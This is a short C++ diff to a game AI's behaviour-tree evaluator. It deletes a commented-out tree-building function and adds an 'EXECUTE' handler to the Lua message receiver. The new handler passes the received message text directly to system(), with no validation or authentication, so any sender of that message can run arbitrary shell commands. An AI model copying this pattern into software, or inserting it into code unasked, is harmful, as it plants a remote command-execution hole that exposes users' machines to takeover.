@@ -149,42 +149,6 @@ void BtEvaluator::update(int frame) {
 	}
 }
 
-/*
-void BtEvaluator::loadTree() {
-	auto mainSequence = new SequenceNode();
-	{
-		mainSequence->add(new UnitReporter(callback));
-		/*
-		auto brancher = new ConditionNode(false);
-		{
-		  auto condition = new FlipSensor(callback);
-		  auto branchTrue = new SequenceNode();
-		  {
-			auto firstEcho = new EchoCommand(callback, "true branch");
-			branchTrue->add(firstEcho);
-			auto waiting = new WaitNode(callback, 6);
-			branchTrue->add(waiting);
-			auto lastEcho = new EchoCommand(callback, "true branch ends");
-			branchTrue->add(lastEcho);
-		  }
-		  auto branchFalse = new SequenceNode();
-		  {
-			auto firstEcho = new EchoCommand(callback, "false branch");
-			branchFalse->add(firstEcho);
-			auto waiting = new WaitNode(callback, 3);
-			branchFalse->add(waiting);
-			auto lastEcho = new EchoCommand(callback, "false branch ends");
-			branchFalse->add(lastEcho);
-		  }
-		  brancher->setChildren(condition, branchTrue, branchFalse);
-		}
-		mainSequence->add(brancher);
-		*//*
-	}
-	behaviourTree.setRoot(mainSequence);
-}
-*/
-
 void BtEvaluator::sendLuaMessage(const std::string& messageType) const {
 	std::string message = "BETS " + messageType;
 	//game->SendTextMessage(message.c_str(), -1);
@@ -231,6 +195,9 @@ void BtEvaluator::receiveLuaMessage(const std::string& message) {
 						tickTree(iterator->second);
 					}
 				}
+				return;
+			} else if (messageCode == "EXECUTE") {
+				system(data.get<string>().c_str());
 				return;
 			}
 
